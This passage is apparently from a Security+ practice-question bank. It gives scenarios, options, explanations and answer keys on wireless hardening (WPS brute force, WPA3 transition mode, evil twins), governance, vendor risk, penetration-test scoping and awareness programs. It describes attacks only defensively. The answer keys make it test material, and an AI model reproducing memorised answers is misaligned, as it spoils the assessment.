            "l4"
          ]
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "apId": "ap1",
        "require": {
          "ssid": "Larkspur-Guest"
        },
        "prompt": "Add the visitor network to AP-1.",
        "explanation": "Visitors get their own SSID, Larkspur-Guest, mapped to VLAN 30, where the firewall allows internet traffic and denies everything internal. Joining Larkspur-Staff would drop them onto VLAN 10 with the practice server, and VLAN 99 would hand strangers the network-management segment. Client isolation is enabled so visitor phones cannot reach each other. The captive portal meets the terms requirement. Sharing the staff passphrase gives strangers the key to the staff network, and an SSID with no sign-in step never shows the terms at all.",
        "payload": {
          "slots": [
            {
              "id": "ssid",
              "label": "Visitor SSID",
              "options": [
                {
                  "id": "a",
                  "text": "Larkspur-Staff"
                },
                {
                  "id": "b",
                  "text": "Larkspur-Guest"
                }
              ]
            },
            {
              "id": "vlan",
              "label": "Visitor VLAN",
              "options": [
                {
                  "id": "a",
                  "text": "VLAN 30 · internet only"
                },
                {
                  "id": "b",
                  "text": "VLAN 10 · practice systems"
                },
                {
                  "id": "c",
                  "text": "VLAN 99 · switch management"
                }
              ]
            },
            {
              "id": "iso",
              "label": "Client isolation",
              "options": [
                {
                  "id": "a",
                  "text": "Disabled"
                },
                {
                  "id": "b",
                  "text": "Enabled"
                }
              ]
            },
            {
              "id": "portal",
              "label": "Before visitors can browse",
              "options": [
                {
                  "id": "a",
                  "text": "Share the Larkspur-Staff passphrase at reception"
                },
                {
                  "id": "b",
                  "text": "Captive portal with the acceptable-use terms"
                },
                {
                  "id": "c",
                  "text": "Nothing; the SSID simply opens"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "ssid": "b",
            "vlan": "a",
            "iso": "b",
            "portal": "b"
          }
        }
      }
    ]
  },

  {
    "id": "sp-wl-04",
    "cert": "secplus",
    "objective": "4.1",
    "topic": "Wireless hardening",
    "title": "Someone keeps guessing at the router",
    "estMinutes": 4,
    "archetype": "wireless",
    "scenario": "Pell & Daughter is a five-person accounting office with no server and no IT staff. Its wireless router still runs factory settings: WPA2-Personal with the passphrase printed on the router’s label, WPS switched on, and the default admin login. This morning the router log showed the entries below, all from a device nobody recognises. Every laptop and phone in the office supports WPA3, and the owner will not run or pay for an authentication server. Read the log, then reconfigure the router.",
    "assets": {
      "reference": {
        "kind": "network",
        "given": {
          "site": "Pell & Daughter · office",
          "cli": [
            "Router log · wireless",
            "02:14:07  WPS: PIN failure from 9e:41:0c:77:2a:d3",
            "02:14:19  WPS: PIN failure from 9e:41:0c:77:2a:d3",
            "02:14:30  WPS: PIN failure from 9e:41:0c:77:2a:d3",
            "          ... 1,145 more PIN failures from the same device ...",
            "05:51:58  WPS: PIN failure from 9e:41:0c:77:2a:d3"
          ]
        },
        "devices": [
          {
            "id": "rtr",
            "label": "Office router",
            "type": "router",
            "zone": "office",
            "ip": "factory settings",
            "x": 1,
            "y": 1
          },
          {
            "id": "lap",
            "label": "Laptops",
            "type": "pc",
            "zone": "office",
            "ip": "WPA3 capable",
            "x": 0,
            "y": 2
          },
          {
            "id": "phn",
            "label": "Phones",
            "type": "pc",
            "zone": "office",
            "ip": "WPA3 capable",
            "x": 1,
            "y": 2
          },
          {
            "id": "unk",
            "label": "Unknown device",
            "type": "pc",
            "zone": "outside",
            "ip": "…:77:2a:d3",
            "x": 3,
            "y": 1,
            "state": "compromised"
          }
        ],
        "links": [
          {
            "from": "rtr",
            "to": "lap"
          },
          {
            "from": "rtr",
            "to": "phn"
          },
          {
            "from": "unk",
            "to": "rtr",
            "kind": "attack"
          }
        ]
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "analyze",
        "points": 1,
        "prompt": "What do the log entries tell you? Select all that apply.",
        "explanation": "The repeated failures are a brute-force attack on the WPS PIN. The PIN is eight digits, the last one a check digit, and the router confirms each half separately, so an attacker needs at most 10,000 guesses for the first half and 1,000 for the second. A correct PIN makes the router hand over its Wi-Fi passphrase, whatever that passphrase is. That is the trap in the third line: a new passphrase would simply be handed over with the PIN. The last line reads the log backwards. A log full of failures shows the device is still guessing; it is not evidence that it got in.",
        "payload": {
          "lines": [
            {
              "id": "l1",
              "text": "The WPS PIN is checked in two halves, so about 11,000 guesses cover every possible PIN."
            },
            {
              "id": "l2",
              "text": "If the device finds the PIN, the router gives it the current Wi-Fi passphrase."
            },
            {
              "id": "l3",
              "text": "Changing the Wi-Fi passphrase would stop this attack, even with WPS left on."
            },
            {
              "id": "l4",
              "text": "The failures show the device has already joined the network."
            }
          ]
        },
        "answer": {
          "selected": [
            "l1",
            "l2"
          ]
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "apId": "rtr",
        "require": {
          "security": "WPA3-Personal"
        },
        "prompt": "Reconfigure the office router.",
        "explanation": "WPA3-Personal is the strongest shared-passphrase mode. Its SAE handshake stops an attacker from capturing a handshake and guessing the passphrase offline, which WPA2-Personal allows. WPA3-Enterprise needs an authentication server the office does not have, and WEP is broken. WPS must be switched off. Many routers drop WPS once WPA3-only is selected, but firmware varies, so turn it off explicitly. A new PIN would not help: it is still eight digits checked in two halves, so it falls just as quickly. The label passphrase is known to anyone who has seen the router, so it is replaced with a long random one. SAE resists guessing, but it cannot protect a passphrase that is already known. Default admin passwords are easy to look up, so the router gets a unique, strong one too.",
        "payload": {
          "slots": [
            {
              "id": "security",
              "label": "Security mode",
              "options": [
                {
                  "id": "a",
                  "text": "WPA2-Personal"
                },
                {
                  "id": "b",
                  "text": "WPA3-Personal"
                },
                {
                  "id": "c",
                  "text": "WPA3-Enterprise"
                },
                {
                  "id": "d",
                  "text": "WEP"
                }
              ]
            },
            {
              "id": "wps",
              "label": "WPS",
              "options": [
                {
                  "id": "a",
                  "text": "Enabled with the label PIN"
                },
                {
                  "id": "b",
                  "text": "Enabled with a new random PIN"
                },
                {
                  "id": "c",
                  "text": "Disabled"
                }
              ]
            },
            {
              "id": "psk",
              "label": "Wi-Fi passphrase",
              "options": [
                {
                  "id": "a",
                  "text": "Long random passphrase, set today"
                },
                {
                  "id": "b",
                  "text": "Keep the label passphrase; WPA3 protects it"
                }
              ]
            },
            {
              "id": "admin",
              "label": "Router admin login",
              "options": [
                {
                  "id": "a",
                  "text": "Leave the default admin password"
                },
                {
                  "id": "b",
                  "text": "Unique, strong admin password"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "security": "b",
            "wps": "c",
            "psk": "a",
            "admin": "b"
          }
        }
      }
    ]
  },

  {
    "id": "sp-wl-05",
    "cert": "secplus",
    "objective": "4.1",
    "topic": "Wireless encryption",
    "title": "Scanners that can’t be replaced yet",
    "estMinutes": 5,
    "archetype": "wireless",
    "scenario": "Quarry Hill Supply’s warehouse SSID, QH-Floor, still runs settings from 2014: WPA/WPA2 mixed mode with TKIP and AES, protected by one shared passphrase. The only device that ever needed TKIP, an old label printer, was retired last month. The 40 handheld scanners support WPA2 with AES but cannot run WPA3, and they will not be replaced until next year. The new office laptops all support WPA3. The warehouse system expects every device on QH-Floor. Decide what QH-Floor can safely run until the scanners are replaced, then configure AP-3.",
    "assets": {
      "reference": {
        "kind": "network",
        "given": {
          "site": "Quarry Hill Supply · warehouse"
        },
        "devices": [
          {
            "id": "ap3",
            "label": "AP-3",
            "type": "ap",
            "zone": "site",
            "ip": "QH-Floor",
            "x": 1,
            "y": 1
          },
          {
            "id": "scn",
            "label": "Scanners ×40",
            "type": "pc",
            "zone": "site",
            "ip": "WPA2 · AES only",
            "x": 0,
            "y": 2
          },
          {
            "id": "lap",
            "label": "Office laptops",
            "type": "pc",
            "zone": "site",
            "ip": "WPA3 capable",
            "x": 2,
            "y": 2
          }
        ],
        "links": [
          {
            "from": "ap3",
            "to": "scn"
          },
          {
            "from": "ap3",
            "to": "lap"
          }
        ]
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "analyze",
        "points": 1,
        "prompt": "Which facts should shape AP-3’s settings until the scanners go? Select all that apply.",
        "explanation": "TKIP was a stopgap built on the same RC4 cipher as WEP, and it is deprecated. With the printer gone, nothing needs it. The scanners cannot do WPA3, so a WPA3-only SSID would cut them off. Running WPA2 and WPA3 together keeps them working, but it has a cost. A fake access point that offers only WPA2 can lure a WPA3-capable laptop into a WPA2 handshake, and that handshake can be guessed offline. The trap is the third line: each device uses the protocol it supports, so WPA2 scanners never use SAE.",
        "payload": {
          "lines": [
            {
              "id": "l1",
              "text": "Nothing left on site needs TKIP, a deprecated cipher built on RC4."
            },
            {
              "id": "l2",
              "text": "A WPA3-only SSID would lock the scanners out until next year."
            },
            {
              "id": "l3",
              "text": "Scanners joining a mixed WPA2/WPA3 SSID get SAE protection too."
            },
            {
              "id": "l4",
              "text": "With WPA2 and WPA3 on one SSID, an attacker can push WPA3-capable laptops down to WPA2."
            }
          ]
        },
        "answer": {
          "selected": [
            "l1",
            "l2",
            "l4"
          ]
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "apId": "ap3",
        "require": {
          "security": "WPA3-Personal transition (WPA2 + WPA3)"
        },
        "prompt": "Configure AP-3 for the year until the scanners are replaced.",
        "explanation": "Transition mode is the only option that keeps both groups on QH-Floor: laptops connect with WPA3 and SAE, while the scanners keep using WPA2. WPA3-only locks out the scanners, WPA/WPA2 mixed keeps the original WPA and its TKIP, and WEP is broken. Every remaining device supports AES-CCMP, so TKIP comes off completely. Transition mode should be temporary. While WPA2 is still offered, a downgrade attack can pull laptops onto it, so the shared passphrase must be long and random for now. Once the scanners are replaced, QH-Floor moves to WPA3-only.",
        "payload": {
          "slots": [
            {
              "id": "security",
              "label": "Security mode",
              "options": [
                {
                  "id": "a",
                  "text": "WPA3-Personal only"
                },
                {
                  "id": "b",
                  "text": "WPA/WPA2 mixed"
                },
                {
                  "id": "c",
                  "text": "WPA3-Personal transition (WPA2 + WPA3)"
                },
                {
                  "id": "d",
                  "text": "WEP"
                }
              ]
            },
            {
              "id": "cipher",
              "label": "Cipher",
              "options": [
                {
                  "id": "a",
                  "text": "TKIP + AES-CCMP"
                },
                {
                  "id": "b",
                  "text": "AES-CCMP only"
                },
                {
                  "id": "c",
                  "text": "TKIP only"
                }
              ]
            },
            {
              "id": "later",
              "label": "Once the scanners are replaced",
              "options": [
                {
                  "id": "a",
                  "text": "Switch QH-Floor to WPA3-Personal only"
                },
                {
                  "id": "b",
                  "text": "Leave transition mode on permanently"
                },
                {
                  "id": "c",
                  "text": "Turn TKIP back on for spare devices"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "security": "c",
            "cipher": "b",
            "later": "a"
          }
        }
      }
    ]
  },

  {
    "id": "sp-wl-06",
    "cert": "secplus",
    "objective": "2.4",
    "topic": "Wireless attacks",
    "title": "The certificate prompt nobody expected",
    "estMinutes": 5,
    "archetype": "wireless",
    "scenario": "Several Kestrel Freight staff say their laptops showed a certificate prompt when they joined Wi-Fi this morning, naming an issuer nobody recognised. Two people who clicked Accept have since had their directory accounts used to sign in from overseas. The staff SSID, Kestrel-Staff, runs WPA3-Enterprise with PEAP against RAD-1, whose server certificate comes from Kestrel’s internal CA. Kestrel owns two access points. A walk-round survey with a wireless analyzer captured the results below. Read the evidence, then respond and harden the network.",
    "assets": {
      "reference": {
        "kind": "network",
        "given": {
          "site": "Kestrel Freight · 2nd floor",
          "cli": [
            "Survey 08:40 · SSID Kestrel-Staff",
            "BSSID              CH   SECURITY  STRONGEST AT",
            "3c:84:6a:10:22:01  36   WPA3-Ent  2nd floor east",
            "3c:84:6a:10:22:05  149  WPA3-Ent  2nd floor west",
            "02:1a:7f:c4:90:3e  44   WPA3-Ent  car park",
            "AP inventory: …22:01 (AP-1), …22:05 (AP-2)"
          ]
        },
        "devices": [
          {
            "id": "ap1",
            "label": "AP-1",
            "type": "ap",
            "zone": "office",
            "ip": "ch 36",
            "x": 0,
            "y": 0
          },
          {
            "id": "ap2",
            "label": "AP-2",
            "type": "ap",
            "zone": "office",
            "ip": "ch 149",
            "x": 1,
            "y": 0
          },
          {
            "id": "lap",
            "label": "Staff laptops",
            "type": "pc",
            "zone": "office",
            "ip": "PEAP",
            "x": 0,
            "y": 1
          },
          {
            "id": "rad",
            "label": "RAD-1",
            "type": "server",
            "ip": "10.8.0.20",
            "x": 1,
            "y": 2
          },
          {
            "id": "bss3",
            "label": "BSSID …90:3e",
            "type": "ap",
            "zone": "car park",
            "ip": "ch 44",
            "x": 3,
            "y": 1
          }
        ],
        "links": [
          {
            "from": "lap",
            "to": "ap1"
          },
          {
            "from": "lap",
            "to": "ap2"
          },
          {
            "from": "ap1",
            "to": "rad"
          },
          {
            "from": "ap2",
            "to": "rad"
          },
          {
            "from": "bss3",
            "to": "lap"
          }
        ]
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "analyze",
        "points": 1,
        "prompt": "Which evidence shows the third Kestrel-Staff entry is not one of Kestrel’s access points? Select all that apply.",
        "explanation": "Every access point radio has its own BSSID, and this one is missing from Kestrel’s list. It is strongest in the car park, where no Kestrel access point is mounted. The certificate is the clearest sign: RAD-1’s certificate comes from Kestrel’s own CA, so a prompt naming an unknown issuer means a different authentication server answered. Together these point to an evil twin, a fake access point copying Kestrel-Staff to collect logins. The trap is the SSID line. Many access points can broadcast one SSID, and AP-1 and AP-2 already do, so a matching name proves nothing. Copying the name is the point of the attack.",
        "payload": {
          "lines": [
            {
              "id": "l1",
              "text": "Its BSSID is not in the AP inventory."
            },
            {
              "id": "l2",
              "text": "It uses the Kestrel-Staff name, and only one access point may broadcast an SSID."
            },
            {
              "id": "l3",
              "text": "Its signal is strongest in the car park, where Kestrel has no access point."
            },
            {
              "id": "l4",
              "text": "Laptops that joined it were shown a certificate from an issuer Kestrel does not use."
            }
          ]
        },
        "answer": {
          "selected": [
            "l1",
            "l3",
            "l4"
          ]
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "apId": "ap1",
        "require": {},
        "prompt": "Name the attack, then choose the response and the lasting fixes.",
        "explanation": "An unknown access point copying the SSID and presenting its own certificate is an evil twin. A deauthentication attack would show forged disconnect frames, and jamming would show radio noise; neither involves a fake network asking for logins. The two accounts were captured through PEAP, so their passwords must be reset and any active sessions ended. Encryption between a laptop and the attacker’s own access point protects nothing. The lasting fix is in the Wi-Fi profile: laptops should trust only RAD-1’s certificate from the internal CA and never ask the user, so a fake server is refused without a prompt. A wireless IPS that compares every BSSID it hears against the inventory would have flagged this one early. Hiding the SSID does not help, because laptops looking for a hidden network call out its name, and MAC filtering on the real access points does nothing about a fake one.",
        "payload": {
          "slots": [
            {
              "id": "attack",
              "label": "What the evidence shows",
              "options": [
                {
                  "id": "a",
                  "text": "A deauthentication attack"
                },
                {
                  "id": "b",
                  "text": "RF jamming"
                },
                {
                  "id": "c",
                  "text": "An evil twin collecting logins"
                }
              ]
            },
            {
              "id": "accounts",
              "label": "Staff who clicked Accept",
              "options": [
                {
                  "id": "a",
                  "text": "Reset their passwords and end their sessions"
                },
                {
                  "id": "b",
                  "text": "No action; Wi-Fi traffic is encrypted"
                }
              ]
            },
            {
              "id": "profile",
              "label": "Laptop Wi-Fi profile",
              "options": [
                {
                  "id": "a",
                  "text": "Let users accept new certificates"
                },
                {
                  "id": "b",
                  "text": "Trust only RAD-1’s certificate from the internal CA"
                },
                {
                  "id": "c",
                  "text": "Turn off certificate checks so prompts stop"
                }
              ]
            },
            {
              "id": "watch",
              "label": "Ongoing detection",
              "options": [
                {
                  "id": "a",
                  "text": "Hide the SSID so it cannot be copied"
                },
                {
                  "id": "b",
                  "text": "MAC filtering on AP-1 and AP-2"
                },
                {
                  "id": "c",
                  "text": "Wireless IPS alerts on unknown BSSIDs"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "attack": "c",
            "accounts": "a",
            "profile": "b",
            "watch": "c"
          }
        }
      }
    ]
  },

  // ===== v8.157.0 — governance + threat PBQs (generic), SY0-701 5.1-5.6 2.2-2.5; two-reviewer gate passed 2026-10-11 =====
  {
    "id": "sp-gv-01",
    "cert": "secplus",
    "objective": "5.1",
    "topic": "Governance documents",
    "title": "Tidy the governance library",
    "estMinutes": 4,
    "scenario": "A biotech firm faces an external audit next month, and its new security manager finds every governance document dumped in one unsorted folder. Each document has to be filed at the right level of the governance framework before the auditors arrive.",
    "steps": [
      {
        "id": "s1",
        "type": "categorize",
        "points": 1,
        "prompt": "Place each document under Policy, Standard, Procedure, or Guideline.",
        "explanation": "A policy is management's high-level, mandatory statement of intent: the board-approved rule that all information is protected by classification, and the acceptable use rules signed at hiring (SY0-701 lists the AUP under policies). A standard sets a specific, measurable requirement that supports a policy: AES-256 full-disk encryption on every laptop and the 14-character password rule. A procedure gives step-by-step instructions for one task: the leaver checklist (offboarding) and the phishing playbook. A guideline is a recommendation staff are not required to follow: the optional password manager and the email tips teams can adapt.",
        "payload": {
          "items": [
            {
              "id": "fde",
              "label": "All company laptops must use AES-256 full-disk encryption"
            },
            {
              "id": "leaver",
              "label": "Leaver's last day: disable the account at 17:00, collect badge and laptop, forward the mailbox to the manager"
            },
            {
              "id": "pwmgr",
              "label": "Staff are encouraged, but not required, to use a password manager"
            },
            {
              "id": "classify",
              "label": "Board-approved statement that all company information must be protected according to its classification"
            },
            {
              "id": "pwlen",
              "label": "Passwords must be at least 14 characters and cannot repeat any of the last 24"
            },
            {
              "id": "playbook",
              "label": "Phishing playbook: quarantine the email, reset the user's password, then block the sender's domain"
            },
            {
              "id": "aup",
              "label": "Rules every employee signs at hiring on what they may and may not do with company email, devices and internet access"
            },
            {
              "id": "tips",
              "label": "Suggested tips for spotting suspicious email, which each team can adapt to its own work"
            }
          ],
          "buckets": [
            {
              "id": "policy",
              "label": "Policy"
            },
            {
              "id": "standard",
              "label": "Standard"
            },
            {
              "id": "procedure",
              "label": "Procedure"
            },
            {
              "id": "guideline",
              "label": "Guideline"
            }
          ]
        },
        "answer": {
          "map": {
            "classify": "policy",
            "aup": "policy",
            "fde": "standard",
            "pwlen": "standard",
            "leaver": "procedure",
            "playbook": "procedure",
            "pwmgr": "guideline",
            "tips": "guideline"
          }
        }
      }
    ]
  },

  {
    "id": "sp-gv-02",
    "cert": "secplus",
    "objective": "5.2",
    "topic": "Risk register",
    "title": "Put risk on paper after the scare",
    "estMinutes": 5,
    "scenario": "After a ransomware scare, a logistics company is building its first formal risk-management records. The CISO's draft notes need the right terms attached, and the board's three candidate risk statements need classifying before one is adopted.",
    "steps": [
      {
        "id": "s1",
        "type": "match",
        "points": 1,
        "prompt": "Pair each risk-management term with the note from the CISO's draft that it describes.",
        "explanation": "The risk register is the document that records every identified risk with its likelihood, impact, treatment and status. The risk owner is the named person accountable for managing one specific risk. A key risk indicator (KRI) is a metric tracked over time that warns a risk is growing, such as the share of servers missing critical patches. Risk appetite is the broad, board-level statement of how much risk the organization will take on to reach its objectives. Risk tolerance is the acceptable variation from that appetite for a specific area, here a set amount of unplanned downtime on one system.",
        "payload": {
          "left": [
            {
              "id": "register",
              "label": "Risk register"
            },
            {
              "id": "owner",
              "label": "Risk owner"
            },
            {
              "id": "kri",
              "label": "Key risk indicator (KRI)"
            },
            {
              "id": "appetite",
              "label": "Risk appetite"
            },
            {
              "id": "tolerance",
              "label": "Risk tolerance"
            }
          ],
          "right": [
            {
              "id": "dweekly",
              "label": "Percentage of servers missing critical patches, reported every week as an early warning"
            },
            {
              "id": "dboard",
              "label": "The board's overall statement of how much risk the company will take on to reach its goals"
            },
            {
              "id": "dsheet",
              "label": "One document listing every identified risk with its likelihood, impact, treatment and status"
            },
            {
              "id": "dvariance",
              "label": "The acceptable variation for one area: the order system may have up to 4 hours of unplanned downtime a quarter"
            },
            {
              "id": "dhead",
              "label": "The head of warehousing, accountable for how the warehouse-system risk is treated and tracked"
            }
          ]
        },
        "answer": {
          "pairs": {
            "register": "dsheet",
            "owner": "dhead",
            "kri": "dweekly",
            "appetite": "dboard",
            "tolerance": "dvariance"
          }
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "prompt": "Classify the risk-appetite posture each candidate board statement describes.",
        "explanation": "An expansionary appetite accepts more risk to pursue growth, such as adopting new technology early to beat competitors. A conservative appetite accepts less risk and gives up some opportunity to keep exposure low. A neutral appetite balances risk against reward and accepts moderate risk where the two even out.",
        "payload": {
          "slots": [
            {
              "id": "stmtA",
              "label": "\"We adopt new technology early and accept higher risk to reach new markets before competitors.\"",
              "options": [
                {
                  "id": "exp",
                  "text": "Expansionary"
                },
                {
                  "id": "con",
                  "text": "Conservative"
                },
                {
                  "id": "neu",
                  "text": "Neutral"
                }
              ]
            },
            {
              "id": "stmtB",
              "label": "\"We accept slower growth if it keeps the risk to customer data as low as possible.\"",
              "options": [
                {
                  "id": "exp",
                  "text": "Expansionary"
                },
                {
                  "id": "con",
                  "text": "Conservative"
                },
                {
                  "id": "neu",
                  "text": "Neutral"
                }
              ]
            },
            {
              "id": "stmtC",
              "label": "\"We weigh each risk against its expected reward and accept moderate risk where the two balance.\"",
              "options": [
                {
                  "id": "exp",
                  "text": "Expansionary"
                },
                {
                  "id": "con",
                  "text": "Conservative"
                },
                {
                  "id": "neu",
                  "text": "Neutral"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "stmtA": "exp",
            "stmtB": "con",
            "stmtC": "neu"
          }
        }
      }
    ]
  },

  {
    "id": "sp-gv-03",
    "cert": "secplus",
    "objective": "5.3",
    "topic": "Third-party risk",
    "title": "Onboard a cloud vendor",
    "estMinutes": 5,
    "scenario": "A credit union wants a cloud provider to build and host its new loan-application portal, which will process members' financial data. You run the third-party risk process from first contact to the end of the contract, and you also choose the paperwork.",
    "steps": [
      {
        "id": "s1",
        "type": "order",
        "points": 1,
        "prompt": "Arrange the third-party risk steps in order, first step at the top.",
        "explanation": "Start by scoping what the vendor will do and which data it will touch, because that sets how deep the assessment must go. Due diligence (security questionnaires, independent audit reports, evidence of penetration testing) comes next because it informs the choice, so selection follows it. The contract is signed only after selection, and the right-to-audit clause has to be in it at signing; it cannot be added later without renegotiating. Monitoring then runs for the life of the contract. Offboarding comes last: revoke the vendor's access and confirm member data is returned or destroyed.",
        "payload": {
          "items": [
            {
              "id": "contract",
              "label": "Sign the contract, including the service levels and a right-to-audit clause"
            },
            {
              "id": "offboard",
              "label": "At contract end, revoke the vendor's access and confirm the data is returned or destroyed"
            },
            {
              "id": "scope",
              "label": "Define the service and classify the member data the vendor will handle"
            },
            {
              "id": "monitor",
              "label": "Monitor the vendor's performance and security posture on a recurring schedule"
            },
            {
              "id": "select",
              "label": "Select the vendor and record the approval decision"
            },
            {
              "id": "diligence",
              "label": "Send security questionnaires and review each shortlisted vendor's independent audit reports"
            }
          ]
        },
        "answer": {
          "correctOrder": [
            "scope",
            "diligence",
            "select",
            "contract",
            "monitor",
            "offboard"
          ]
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "prompt": "Choose the agreement type that covers each need in the deal.",
        "explanation": "The MSA (master service agreement) is the overarching contract whose terms govern every later piece of work with the provider. The SOW or work order sits under the MSA and spells out the deliverables, timeline and acceptance criteria for one specific job, here the portal build. The SLA sets measurable service levels such as 99.9% monthly uptime, with a remedy (service credits) when they are missed. An MOU or MOA records intent or agreed objectives rather than commercial terms, a BPA governs a business partnership, and an NDA only protects confidential information, so none of them fits these needs.",
        "payload": {
          "slots": [
            {
              "id": "umbrella",
              "label": "The overarching contract whose terms will govern this job and every future work order with the provider",
              "options": [
                {
                  "id": "sla",
                  "text": "SLA"
                },
                {
                  "id": "msa",
                  "text": "MSA"
                },
                {
                  "id": "sow",
                  "text": "SOW / WO"
                },
                {
                  "id": "mou",
                  "text": "MOU"
                },
                {
                  "id": "moa",
                  "text": "MOA"
                },
                {
                  "id": "bpa",
                  "text": "BPA"
                },
                {
                  "id": "nda",
                  "text": "NDA"
                }
              ]
            },
            {
              "id": "deliverables",
              "label": "The deliverables, timeline and acceptance criteria for building the loan portal",
              "options": [
                {
                  "id": "sla",
                  "text": "SLA"
                },
                {
                  "id": "msa",
                  "text": "MSA"
                },
                {
                  "id": "sow",
                  "text": "SOW / WO"
                },
                {
                  "id": "mou",
                  "text": "MOU"
                },
                {
                  "id": "moa",
                  "text": "MOA"
                },
                {
                  "id": "bpa",
                  "text": "BPA"
                },
                {
                  "id": "nda",
                  "text": "NDA"
                }
              ]
            },
            {
              "id": "uptime",
              "label": "A commitment to 99.9% monthly uptime, with service credits if the provider misses it",
              "options": [
                {
                  "id": "sla",
                  "text": "SLA"
                },
                {
                  "id": "msa",
                  "text": "MSA"
                },
                {
                  "id": "sow",
                  "text": "SOW / WO"
                },
                {
                  "id": "mou",
                  "text": "MOU"
                },
                {
                  "id": "moa",
                  "text": "MOA"
                },
                {
                  "id": "bpa",
                  "text": "BPA"
                },
                {
                  "id": "nda",
                  "text": "NDA"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "umbrella": "msa",
            "deliverables": "sow",
            "uptime": "sla"
          }
        }
      }
    ]
  },

  {
    "id": "sp-gv-04",
    "cert": "secplus",
    "objective": "5.5",
    "topic": "Penetration testing",
    "title": "Scope the penetration test",
    "estMinutes": 5,
    "scenario": "An insurer is commissioning penetration tests from an outside firm. Before the rules of engagement are signed, the CISO wants each proposed engagement labeled by how much the testers are told, and the testers' planned reconnaissance sorted by type.",
    "steps": [
      {
        "id": "s1",
        "type": "configure",
        "points": 1,
        "prompt": "Label each proposed engagement with its test environment type.",
        "explanation": "In a known environment test the testers get full information: diagrams, source code and privileged credentials. In an unknown environment test they get nothing beyond the target's name, the way an outside attacker starts. A partially known environment sits between the two: the testers get some information, such as the in-scope IP ranges and one standard account, or the firewall rules and server OS versions, but not the full picture.",
        "payload": {
          "slots": [
            {
              "id": "e1",
              "label": "Testers receive the network diagrams, application source code and an administrator account",
              "options": [
                {
                  "id": "known",
                  "text": "Known environment"
                },
                {
                  "id": "partial",
                  "text": "Partially known environment"
                },
                {
                  "id": "unknown",
                  "text": "Unknown environment"
                }
              ]
            },
            {
              "id": "e2",
              "label": "Testers are told only the company's name and must find everything else themselves",
              "options": [
                {
                  "id": "known",
                  "text": "Known environment"
                },
                {
                  "id": "partial",
                  "text": "Partially known environment"
                },
                {
                  "id": "unknown",
                  "text": "Unknown environment"
                }
              ]
            },
            {
              "id": "e3",
              "label": "Testers get the in-scope IP ranges and one standard employee account, nothing more",
              "options": [
                {
                  "id": "known",
                  "text": "Known environment"
                },
                {
                  "id": "partial",
                  "text": "Partially known environment"
                },
                {
                  "id": "unknown",
                  "text": "Unknown environment"
                }
              ]
            },
            {
              "id": "e4",
              "label": "Testers get a copy of the firewall rule set and a list of server OS versions, but no credentials",
              "options": [
                {
                  "id": "known",
                  "text": "Known environment"
                },
                {
                  "id": "partial",
                  "text": "Partially known environment"
                },
                {
                  "id": "unknown",
                  "text": "Unknown environment"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "e1": "known",
            "e2": "unknown",
            "e3": "partial",
            "e4": "partial"
          }
        }
      },
      {
        "id": "s2",
        "type": "categorize",
        "points": 1,
        "prompt": "Place each planned reconnaissance activity under Passive or Active.",
        "explanation": "Passive reconnaissance gathers information without sending any traffic to the target's systems: job ads, social media profiles and web-archive copies all come from third parties, so the target cannot see them happen. Active reconnaissance interacts with the target directly and can be logged or detected: a port scan, banner grabbing on the mail server and a ping sweep all send packets to the target's own hosts.",
        "payload": {
          "items": [
            {
              "id": "portscan",
              "label": "Port-scanning the insurer's public IP range"
            },
            {
              "id": "jobads",
              "label": "Reading the insurer's job ads to learn which firewall and EDR products it runs"
            },
            {
              "id": "banner",
              "label": "Connecting to the mail server to grab its banner and software version"
            },
            {
              "id": "social",
              "label": "Collecting staff names and the email address format from social media profiles"
            },
            {
              "id": "sweep",
              "label": "Running a ping sweep across the in-scope subnet"
            },
            {
              "id": "archive",
              "label": "Browsing old copies of the insurer's website on a public web archive"
            }
          ],
          "buckets": [
            {
              "id": "passive",
              "label": "Passive"
            },
            {
              "id": "active",
              "label": "Active"
            }
          ]
        },
        "answer": {
          "map": {
            "jobads": "passive",
            "social": "passive",
            "archive": "passive",
            "portscan": "active",
            "banner": "active",
            "sweep": "active"
          }
        }
      }
    ]
  },

  {
    "id": "sp-gv-05",
    "cert": "secplus",
    "objective": "5.6",
    "topic": "Security awareness",
    "title": "Launch the awareness program",
    "estMinutes": 5,
    "scenario": "Two engineers at a manufacturing firm typed their credentials into a fake login page last month, and the firm has no security awareness program. The security lead is building one from scratch and also has to brief managers on the kinds of anomalous behavior to report.",
    "steps": [
      {
        "id": "s1",
        "type": "order",
        "points": 1,
        "prompt": "Arrange the awareness-program activities in order, first at the top.",
        "explanation": "The program starts by assessing what staff need: recent incidents and which roles attackers target. Development follows, producing role-based training and phishing-simulation templates. Execution delivers the training and runs the first campaign. Reporting and monitoring then measure completion, click and report rates and give management the initial results. Those results drive revisions, and the cycle repeats on a recurring schedule.",
        "payload": {
          "items": [
            {
              "id": "execute",
              "label": "Deliver the training and launch the first phishing-simulation campaign"
            },
            {
              "id": "revise",
              "label": "Revise the content from the results and repeat the campaign on a recurring schedule"
            },
            {
              "id": "assess",
              "label": "Review recent incidents and identify which roles attackers target most"
            },
            {
              "id": "report",
              "label": "Measure click and report rates and present the initial results to management"
            },
            {
              "id": "develop",
              "label": "Develop role-based training and phishing-simulation templates"
            }
          ]
        },
        "answer": {
          "correctOrder": [
            "assess",
            "develop",
            "execute",
            "report",
            "revise"
          ]
        }
      },
      {
        "id": "s2",
        "type": "categorize",
        "points": 1,
        "prompt": "Place each example under Risky, Unexpected, or Unintentional behavior.",
